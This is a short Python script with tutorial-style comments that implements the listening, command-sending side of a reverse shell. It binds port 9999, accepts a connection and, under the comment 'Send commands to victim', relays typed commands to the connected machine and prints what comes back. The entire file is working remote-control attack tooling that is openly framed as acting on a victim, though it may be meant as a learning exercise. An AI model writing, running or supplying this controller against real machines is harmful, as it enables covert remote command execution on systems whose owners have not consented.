import socket
# sys is just implementing command line in python file

import sys


def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        # socket.socket is used to create a socket .....
        s = socket.socket()
    #     msg is an object which has an error message like we write exception e in some other language
    except socket.error as msg:
        print("Socket creation error " + str(msg))


#  Binding the socket and listening the connections

def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Binding the port error " + str(msg) + "\n" + "retrying...")
        bind_socket()  # for retrying till binding is not successful....

#  establishing connection with a client (socket must be listening) that means  s.listen is must


def socket_accept():

    """ we store the value of s.accept in conn and
    address because conn contains the connection and
    the address contains the list of ip and the port where address[0]
    contains ip and address[1] contains port """

    conn, address = s.accept()
    print(" connection is established ! " + " I.P " + address[0] + " Port " + str(address[1]))
    send_commands(conn)
    conn.close()

# Send commands to victim


def send_commands(conn):
    while True:
        """
        1)infinite while loop is used because if we don't use it we can only send 1 command because after that 
        connection will be closed
        2) cmd = input () will take input from us to which command to send 
        3)sys module is used to take exit from command prompt
        4) since data send is in form of bytes and data received will also be in form of bytes so we need to encode 
        it into a string
        5) and then we store it in  client_response variable
        6) end = "" is used to go to next line in order to execute new command and if not use it we may not 
        be able to execute a new command
        """
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()

